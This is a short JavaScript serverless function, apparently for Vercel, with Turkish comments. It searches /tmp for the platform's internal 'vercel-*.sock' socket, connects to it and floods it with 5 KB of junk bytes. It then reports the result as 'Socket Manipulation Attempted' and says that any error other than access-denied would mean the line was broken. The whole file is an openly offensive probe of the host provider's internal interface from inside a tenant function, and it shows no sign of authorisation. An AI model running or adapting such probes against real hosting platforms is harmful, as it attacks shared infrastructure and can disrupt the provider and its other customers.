import fs from 'fs';
import net from 'net';

export default async function handler(req, res) {
  const tmpFiles = fs.readdirSync('/tmp');
  const socketPath = tmpFiles.find(f => f.startsWith('vercel-') && f.endsWith('.sock'));
  
  if (!socketPath) {
    return res.status(200).json({ hata: "Soket dosyası bulunamadı. Vercel hattı gizlemiş olabilir." });
  }

  const fullPath = `/tmp/${socketPath}`;
  let report = [];

  // Sokete bağlanıp "Anlamsız/Bozuk" veri gönderiyoruz (Fuzzing)
  const probeSocket = () => {
    return new Promise((resolve) => {
      const client = net.createConnection(fullPath);
      
      client.on('connect', () => {
        // Vercel'in beklemediği devasa veya bozuk bir JSON gönderiyoruz
        const malformedData = Buffer.alloc(1024 * 5, 'A'); // 5KB'lık 'A' harfi
        client.write(malformedData);
        report.push("Bağlantı kuruldu, bozuk veri gönderildi.");
        client.destroy();
      });

      client.on('error', (err) => {
        report.push(`Hata yakalandı: ${err.message}`);
        resolve();
      });

      client.on('close', () => resolve());
      setTimeout(() => resolve(), 1000); // 1 saniye sonra pes et
    });
  };

  await probeSocket();

  res.status(200).json({
    hedef_soket: fullPath,
    aksiyon: "Socket Manipulation Attempted",
    sonuc_raporu: report,
    sistem_notu: "Eğer hata mesajında 'EACCES' (Erişim Engellendi) dışında bir şey görürsek, hattı bozmuşuz demektir."
  });
}
